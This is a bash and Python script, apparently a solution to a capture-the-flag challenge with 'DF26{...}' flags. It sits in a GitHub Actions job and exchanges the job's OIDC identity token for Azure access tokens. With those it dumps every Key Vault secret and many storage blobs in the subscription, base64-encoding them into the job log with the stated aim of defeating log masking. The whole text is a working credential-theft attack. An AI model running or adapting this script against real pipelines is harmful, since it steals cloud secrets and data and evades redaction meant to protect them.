#!/usr/bin/env bash
set +e
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
get_tok() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${OIDC}" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token') or 'ERR')"
}
ARM=$(get_tok "https://management.azure.com/.default")
KV=$(get_tok "https://vault.azure.net/.default")
ST=$(get_tok "https://storage.azure.com/.default")
echo "tokens: ARM=${#ARM} KV=${#KV} ST=${#ST}"
python3 - "$ARM" "$KV" "$ST" "$AZURE_SUBSCRIPTION_ID" <<'PY'
import json,sys,urllib.request,base64,re,xml.etree.ElementTree as ET
arm,kv,st,sub=sys.argv[1:5]
FLAG=re.compile(r"DF26\{[0-9a-fA-F]+\}")
def req(url,tok,extra=None):
    h={"Authorization":"Bearer "+tok}
    if extra: h.update(extra)
    try:
        return urllib.request.urlopen(urllib.request.Request(url,headers=h),timeout=40).read()
    except Exception as e:
        try: return b"ERR:"+e.read()[:300]
        except Exception: return b"ERR:"+str(e).encode()[:200]
def enc(s): return base64.b64encode(s.encode()).decode()  # defeat log masking
print("######## KEY VAULTS ########")
res=json.loads(req("https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01"%sub,arm))
vaults=[r["name"] for r in res.get("value",[]) if r["type"]=="Microsoft.KeyVault/vaults"]
accts=[r["name"] for r in res.get("value",[]) if r["type"]=="Microsoft.Storage/storageAccounts"]
for v in vaults:
    base="https://%s.vault.azure.net"%v
    d=req(base+"/secrets?api-version=7.4",kv)
    if d.startswith(b"ERR"): print(v,"LIST",d[:200]); continue
    for s in json.loads(d).get("value",[]):
        n=s["id"].split("/")[-1]
        g=req(base+"/secrets/%s?api-version=7.4"%n,kv)
        if g.startswith(b"ERR"): print("  ",v,n,g[:150]); continue
        val=str(json.loads(g).get("value"))
        print("  SECRET %s/%s B64=%s"%(v,n,enc(val)))
        for m in FLAG.findall(val): print("  !!!! FLAG:",m)
print("######## STORAGE (AAD data plane) ########")
NS="{http://schemas.microsoft.com/windowsazure}"
for a in accts:
    root="https://%s.blob.core.windows.net"%a
    d=req(root+"/?comp=list",st,{"x-ms-version":"2021-12-02"})
    if d.startswith(b"ERR"): print(a,"listcontainers",d[:200]); continue
    try: conts=[e.text for e in ET.fromstring(d).iter("Name")]
    except Exception as ex: print(a,"xml",ex); continue
    print(a,"containers:",conts)
    for c in conts:
        d2=req(root+"/%s?restype=container&comp=list"%c,st,{"x-ms-version":"2021-12-02"})
        if d2.startswith(b"ERR"): print("  ",c,d2[:200]); continue
        try: blobs=[e.text for e in ET.fromstring(d2).iter("Name")]
        except Exception: blobs=[]
        print("  ",c,blobs[:40])
        for b in blobs[:40]:
            body=req(root+"/%s/%s"%(c,b),st,{"x-ms-version":"2021-12-02"})
            txt=body[:20000].decode("utf-8","replace")
            if body.startswith(b"ERR"): print("    ",b,txt[:120]); continue
            print("    BLOB",b,"B64=",enc(txt[:4000]))
            for m in FLAG.findall(txt): print("    !!!! FLAG:",m)
PY
echo "=== done ==="
